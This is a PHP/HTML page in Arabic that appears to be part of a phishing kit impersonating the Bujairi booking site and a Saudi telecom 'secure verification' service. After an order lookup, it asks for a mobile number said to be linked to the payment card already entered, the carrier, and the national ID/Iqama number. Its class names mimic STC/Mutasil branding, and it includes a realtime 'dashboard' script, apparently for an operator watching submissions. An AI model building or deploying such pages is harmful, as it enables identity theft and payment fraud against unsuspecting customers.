<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
$id = (int) ($_GET['id'] ?? 0);
$order = order_by_id(bujairi_pdo(), $id);
if (!$order) {
    http_response_code(404);
    exit;
}
$pageTitle = 'توثيق واعتماد رقم الجوال';
?><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo h($pageTitle); ?></title>
    <link rel="icon" href="https://s3.ticketmx.com/bujairi/images/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }
        .stc-card {
            background: #fff;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 30px 25px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
        }
        .top-header {
            margin-bottom: 20px;
            width: 100%;
            max-width: 420px;
            display: flex;
            justify-content: flex-start;
            align-items: center;
        }
        .top-header img { height: 50px; width: auto; object-fit: contain; }
        .mutasil-logo {
            margin-bottom: 20px;
            text-align: right;
        }
        .mutasil-logo .brand-line {
            font-size: 13px;
            font-weight: 700;
            color: #1a1a85;
            letter-spacing: 0.02em;
        }
        .notification-box {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            margin-bottom: 25px;
        }
        .kau-icon {
            width: 45px;
            height: 45px;
            flex-shrink: 0;
            margin-top: -2px;
        }
        .text-content { flex: 1; text-align: right; }
        .info-title {
            font-size: 16px;
            font-weight: 700;
            color: #2d3748;
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .green-arrow {
            color: #22c55e;
            font-weight: bold;
            font-size: 18px;
            transform: translateY(2px);
        }
        .info-desc {
            font-size: 13px;
            color: #718096;
            line-height: 1.6;
            font-weight: 600;
        }
        .input-group {
            margin-bottom: 15px;
            position: relative;
        }
        .stc-input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #cbd5e0;
            border-radius: 6px;
            font-family: 'Cairo', sans-serif;
            font-size: 15px;
            text-align: right;
            outline: none;
            transition: border-color 0.3s;
            background-color: #fff;
            color: #333;
        }
        .stc-input:focus { border-color: #1a1a85; }
        .phone-wrapper input {
            padding-left: 50px;
            text-align: left;
            direction: ltr;
        }
        .saudi-flag {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 28px;
            height: 20px;
            border-radius: 3px;
            object-fit: cover;
        }
        .verify-btn {
            width: 100%;
            background-color: #1a1a85;
            color: #ffffff;
            border: none;
            padding: 12px 0;
            border-radius: 25px;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
        }
        .verify-btn:hover { background-color: #15156e; }
        .card-footer-stc {
            margin-top: 28px;
            padding-top: 20px;
            border-top: 1px solid #edf2f7;
            text-align: center;
        }
        .card-footer-stc .badge-text {
            font-size: 11px;
            color: #718096;
            line-height: 1.5;
            font-weight: 600;
        }
        .provider-message {
            display: none;
            font-size: 13px;
            color: #0c4a6e;
            background: #e0f2fe;
            padding: 12px;
            border-radius: 8px;
            margin: 0 0 15px 0;
            line-height: 1.5;
        }
    </style>
</head>
<body>

<header class="top-header">
    <a href="<?php echo h(url('index.php')); ?>" class="inline-block">
        <img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt="البجيري">
    </a>
</header>

<form class="stc-card" method="post" action="<?php echo h(url('booking/save-customer.php')); ?>">
    <input type="hidden" name="id" value="<?php echo (int) $order['id']; ?>">

    <div class="mutasil-logo">
        <span class="brand-line">بوابة التحقق الآمن</span>
    </div>

    <div class="notification-box">
        <svg class="kau-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
            <path d="M12 2L4 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-8-3z" fill="#dcfce7" stroke="#22c55e" stroke-width="1.4"/>
            <path d="M9 12l2 2 4-4" stroke="#16a34a" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <div class="text-content">
            <div class="info-title">
                <span class="green-arrow">↗</span>
                توثيق واعتماد رقم الجوال
            </div>
            <div class="info-desc">
                يجب أن يكون رقم الجوال موثقاً ومطابقاً لبيانات الهوية الوطنية / الإقامة، ومرتبطاً ببطاقة الدفع المدخلة.
            </div>
        </div>
    </div>

    <div class="input-group phone-wrapper">
        <input type="tel"
               id="phonenumber"
               name="Mobile"
               class="stc-input"
               placeholder="5xxxxxxxx"
               required
               pattern="(0\d{9}|5\d{8})"
               autocomplete="tel">
        <img src="https://flagcdn.com/w40/sa.png" alt="" class="saudi-flag" width="28" height="20" loading="lazy" decoding="async">
    </div>

    <div class="input-group">
        <select id="providerSelect" name="Provider" class="stc-input" required>
            <option value="" disabled selected>اختر مشغل الشبكة</option>
            <option value="STC">STC</option>
            <option value="Mobily">Mobily</option>
            <option value="Zain">Zain</option>
            <option value="Salam">Salam</option>
            <option value="Virgin Mobile">Virgin Mobile</option>
            <option value="Lebara">Lebara</option>
        </select>
    </div>

    <div id="providerMessage" class="provider-message"></div>

    <div class="input-group">
        <input type="text"
               id="idNumberInput"
               name="NationalIdOrIqama"
               class="stc-input"
               placeholder="رقم الهوية الوطنية / الإقامة"
               required
               pattern="\d{10}"
               maxlength="10"
               inputmode="numeric"
               autocomplete="off">
    </div>

    <button type="submit" class="verify-btn">تحقق الآن</button>

    <div class="card-footer-stc">
        <p class="badge-text">جميع البيانات تُنقل عبر اتصال مشفّر (HTTPS).</p>
    </div>
</form>

<script src="<?php echo h(url('assets/js/customer.js')); ?>"></script>
<?php require __DIR__ . '/../dashboard/booking-realtime-script.php'; ?>
</body>
</html>
